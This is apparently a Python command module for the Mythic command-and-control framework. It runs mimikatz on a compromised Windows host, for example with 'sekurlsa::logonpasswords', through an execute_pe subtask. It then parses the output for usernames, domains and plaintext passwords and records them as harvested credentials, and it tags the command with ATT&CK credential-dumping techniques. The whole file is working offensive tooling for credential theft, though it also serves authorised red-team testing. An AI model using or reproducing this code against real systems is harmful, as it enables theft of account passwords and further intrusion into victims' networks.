from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from mythic_payloadtype_container.MythicRPC import *
import base64
import sys

class MimikatzArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # CommandParameter(
            #     name="command",
            #     cli_name="Command",
            #     display_name="Command(s)", 
            #     type=ParameterType.String, 
            #     description="Mimikatz command to run (can be one or more)."),
        ]

    async def parse_arguments(self):
        if len(self.command_line):
            self.add_arg("command", "mimikatz.exe {}".format(self.command_line))
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(MimikatzCommand.help_cmd))


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    attributes=CommandAttributes(
        dependencies=["execute_pe"]
    )
    needs_admin = False
    help_cmd = "mimikatz [command1] [command2] [...]"
    description = "Execute one or more mimikatz commands (e.g. `mimikatz coffee sekurlsa::logonpasswords`)."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = MimikatzArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = ["T1134", "T1098", "T1547", "T1555", "T1003", "T1207", "T1558", "T1552", "T1550"]
    script_only = True

    async def parse_credentials(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
    #     get_responses(task_id: int) -> dict
    # For a given Task, get all of the user_output, artifacts, files, and credentials that task as created within Mythic
    # :param task_id: The TaskID you're interested in (i.e. task.id)
    # :return: A dictionary of the following format:
    # {
    #   "user_output": array of dictionaries where each dictionary is user_output message for the task,
    #   "artifacts": array of dictionaries where each dictionary is an artifact created for the task,
    #   "files": array of dictionaries where each dictionary is a file registered as part of the task,
    #   "credentials": array of dictionaries where each dictionary is a credential created as part of the task.
    # }
        response = await MythicRPC().execute("get_responses", task_id=subtask["id"])
        
        for output in response.response["user_output"]:
            
            mimikatz_out = output.get("response", "")
            comment = "{} from task {} on callback {}".format(
                        output["task"].get("original_params"),
                        output["task"].get("id"),
                        output["task"].get("callback"))
            if mimikatz_out != "":
                lines = mimikatz_out.split("\r\n")
                
                for i in range(len(lines)):
                    line = lines[i]
                    if "Username" in line:
                        # Check to see if Password is null
                        if i+2 >= len(lines):
                            break
                        uname = line.split(" : ")[1].strip()
                        realm = lines[i+1].split(" : ")[1].strip()
                        passwd = lines[i+2].split(" : ")[1].strip()
                        if passwd != "(null)":
                            cred_resp = await MythicRPC().execute(
                                "create_credential",
                                task_id=output["task"].get("id"),
                                credential_type="plaintext",
                                account=uname,
                                realm=realm,
                                credential=passwd,
                                comment=comment
                            )
                            if cred_resp.status != MythicStatus.Success:
                                raise Exception("Failed to register credential")
        return task

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                        command="execute_pe", params_string=task.args.get_arg("command"), subtask_callback_function="parse_credentials")
        return task

    async def process_response(self, response: AgentResponse):
        pass
